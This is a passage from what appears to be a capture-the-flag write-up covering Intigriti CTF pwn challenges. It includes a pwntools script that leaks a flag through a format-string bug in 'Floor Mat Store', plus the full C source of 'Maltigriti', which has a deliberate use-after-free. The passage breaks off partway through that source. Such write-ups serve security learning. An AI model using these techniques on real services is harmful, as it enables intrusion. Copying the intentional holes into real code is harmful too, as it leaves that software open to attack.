integer, it is equal to 18446744073709550214.</span><br></pre></td></tr></table></figure><p>I gave the 18446744073709550214 to remote program, so I got the flag.</p><h2 id="Floor-Mat-Store-112-solves-x2F-100-points"><a href="#Floor-Mat-Store-112-solves-x2F-100-points" class="headerlink" title="Floor Mat Store (112 solves &#x2F; 100 points)"></a>Floor Mat Store (112 solves &#x2F; 100 points)</h2><blockquote><p>Welcome to the Floor Mat store! Itâ€™s kind of like heaven.. for mats<br>Author: CryptoCat<br>floormats.ctf.intigriti.io 1337</p></blockquote><h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>This is the main.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+10h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-11Ch]</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+18h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+20h] [rbp-110h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> *s[<span class="number">6</span>]; <span class="comment">// [rsp+30h] [rbp-100h]</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>]; <span class="comment">// [rsp+60h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">136</span>]; <span class="comment">// [rsp+A0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  s[<span class="number">0</span>] = <span class="string">&quot;1. Cozy Carpet Mat - $10&quot;</span>;</span><br><span class="line">  s[<span class="number">1</span>] = <span class="string">&quot;2. Wooden Plank Mat - $15&quot;</span>;</span><br><span class="line">  s[<span class="number">2</span>] = <span class="string">&quot;3. Fuzzy Shag Mat - $20&quot;</span>;</span><br><span class="line">  s[<span class="number">3</span>] = <span class="string">&quot;4. Rubberized Mat - $12&quot;</span>;</span><br><span class="line">  s[<span class="number">4</span>] = <span class="string">&quot;5. Luxury Velvet Mat - $25&quot;</span>;</span><br><span class="line">  s[<span class="number">5</span>] = <span class="string">&quot;6. Mysterious Flag Mat - $1337&quot;</span>;</span><br><span class="line">  v8 = flag;</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have a flag.txt, right??&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Welcome to the Floor Mat store! It&#x27;s kind of like heaven.. for mats.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Please choose from our currently available floor mats\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Note: Out of stock items have been temporarily delisted\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please select a floor mat:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    <span class="built_in">puts</span>(s[i]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nEnter your choice:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">  <span class="keyword">if</span> ( choice &lt;= <span class="number">0</span> || choice &gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = choice - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">5</span> )</span><br><span class="line">    fgets(flag, <span class="number">64</span>, stream);    <span class="comment">// &lt;-- here</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nPlease enter your shipping address:&quot;</span>);</span><br><span class="line">  fgets(format, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nYour floor mat will be shipped to:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);               <span class="comment">// fsb</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is FSB. So I can leak stack. </p><p>First, save the flag to the stack through menu 6. Then I leak the flag using FSB. </p><h3 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./floormats&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;floormats.ctf.intigriti.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./floormats&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;%18$p_%19$p_%20$p_%21$p_%22$p_%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">strings = p.recvline().strip().split(<span class="string">b&#x27;_0x&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(strings)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">    ascii_str = <span class="built_in">bytes</span>.fromhex(s.decode()).decode()[::-<span class="number">1</span>]</span><br><span class="line">    flag += ascii_str</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Maltigriti-62-solves-x2F-352-points"><a href="#Maltigriti-62-solves-x2F-352-points" class="headerlink" title="Maltigriti (62 solves &#x2F; 352 points)"></a>Maltigriti (62 solves &#x2F; 352 points)</h2><blockquote><p>I just submitted my third bug report to Maltirgiti (a competitor of Intigriti), and it was again closed as a duplicate!<br>Can you figure out what is going on and get me my well deserved swag pack?<br>Author: c0nrad - Sloppy Joe Pirates<br>maltigriti.ctf.intigriti.io 1337</p></blockquote><p>This was my favorite chall I solved recently. &lt;3</p><h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>The C source code was provided. From what Iâ€™ve seen, the code is well written, so Iâ€™ll share it in full.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pwn/maltigriti</span></span><br><span class="line"><span class="comment">// by c0nrad - Sloppy Joe Pirates</span></span><br><span class="line"><span class="comment">// Enjoy &lt;3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> STATUS_ACCEPTED = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> STATUS_REJECTED = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> STATUS_DUPLICATE = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">User</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="type">char</span> password[<span class="number">32</span>];</span><br><span class="line">    <span class="type">int</span> bio_length;</span><br><span class="line">    <span class="type">char</span> *bio;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Report</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">User</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="type">char</span> status;</span><br><span class="line">    <span class="type">long</span> bounty;</span><br><span class="line">    <span class="type">char</span> title[<span class="number">32</span>];</span><br><span class="line">    <span class="type">char</span> body[<span class="number">128</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Report</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_reports</span><span class="params">(<span class="keyword">struct</span> Report *report)</span> &#123;</span><br><span class="line">    <span class="type">int</span> counter = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (report != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--- Report #%d ---\n&quot;</span>, counter++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Title: %s\n&quot;</span>, report-&gt;title);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Body: %s\n&quot;</span>, report-&gt;body);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (report-&gt;status == STATUS_ACCEPTED) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Status: Accepted\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (report-&gt;status == STATUS_REJECTED) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Status: Rejected\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (report-&gt;status == STATUS_DUPLICATE) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Status: Duplicate\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Status: Unknown\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bounty: %ld\n&quot;</span>, report-&gt;bounty);</span><br><span class="line">        report = report-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, (<span class="type">char</span> *)<span class="number">0x0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, (<span class="type">char</span> *)<span class="number">0x0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, (<span class="type">char</span> *)<span class="number">0x0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\n--- Welcome to maltigriti&#x27;s bug bounty reporting system! ---&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0. Register User&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Edit User&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Submit a bug report&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Print Reports&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Print Balance&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. Buy Swag Pack&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;6. Logout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;7. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;menu&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_user</span><span class="params">(<span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="number">0</span> &amp;&amp; user-&gt;bio != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your current bio is: %s\n&quot;</span>, user-&gt;bio);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter your new bio&gt; &quot;</span>);</span><br><span class="line">        fgets(user-&gt;bio, user-&gt;bio_length, <span class="built_in">stdin</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t have a bio yet!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How long is your bio&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user-&gt;bio_length);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        user-&gt;bio = <span class="built_in">malloc</span>(user-&gt;bio_length);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter your new bio&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        fgets(user-&gt;bio, user-&gt;bio_length, <span class="built_in">stdin</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">logout</span><span class="params">(<span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;name, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;password, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;bio, <span class="number">0</span>, user-&gt;bio_length);</span><br><span class="line">        <span class="built_in">free</span>(user-&gt;bio);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">calculate_balance</span><span class="params">(<span class="keyword">struct</span> Report *report, <span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="type">int</span> balance = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (report != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (report-&gt;status == STATUS_ACCEPTED &amp;&amp; report-&gt;user == user) &#123;</span><br><span class="line">            balance += report-&gt;bounty;</span><br><span class="line">        &#125;</span><br><span class="line">        report = report-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your balance is: %d\n&quot;</span>, balance);</span><br><span class="line">    <span class="keyword">return</span> balance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buy_swag_pack</span><span class="params">(<span class="keyword">struct</span> Report *report, <span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (calculate_balance(report, user) &gt;= <span class="number">1337</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You have enough money to buy a swag pack!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;With great swag comes great responsibility.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Here is your swag pack: flag&#123;redacted_redacted&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t have enough money to buy a swag pack!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Keep submitting bug reports and maybe you&#x27;ll get there one day!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;:evil_grin:&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> User *<span class="title function_">register_user</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">User</span> *<span class="title">user</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> User));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name&gt; &quot;</span>);</span><br><span class="line">    fgets(user-&gt;name, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your password&gt; &quot;</span>);</span><br><span class="line">    fgets(user-&gt;password, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    edit_user(user);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Report *<span class="title function_">new_report</span><span class="params">(<span class="keyword">struct</span> Report *firstReport, <span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Report</span> *<span class="title">report</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Report));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (firstReport != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// get last report</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Report</span> *<span class="title">scanner</span> =</span> firstReport;</span><br><span class="line">        <span class="keyword">while</span> (scanner-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            scanner = scanner-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        scanner-&gt;next = report;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        firstReport = report;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    report-&gt;user = user;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your report title&gt; &quot;</span>);</span><br><span class="line">    fgets(report-&gt;title, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the content of your report&gt; &quot;</span>);</span><br><span class="line">    fgets(report-&gt;body, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Automatically mark the status as duplicate so we don&#x27;t have to pay anyone :evil_grin:</span></span><br><span class="line">    report-&gt;status = STATUS_DUPLICATE;</span><br><span class="line">    report-&gt;bounty = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Thank you for submitting your bug report!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unfortunately our records indicate that this bug has already been submitted!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Report will be closed and marked as duplicate.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hope you didn&#x27;t spend too much time on it! ( Í¡Â° ÍœÊ– Í¡Â°) &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> firstReport;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Report</span> *<span class="title">reports</span> =</span> <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">User</span> *<span class="title">user</span> =</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> report_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> menu_choice = <span class="number">0</span>;</span><br><span class="line">    setup();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu_choice);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (menu_choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                user = register_user();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                edit_user(user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                reports = new_report(reports, user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                print_reports(reports);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                calculate_balance(reports, user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                buy_swag_pack(reports, user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                logout(user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span 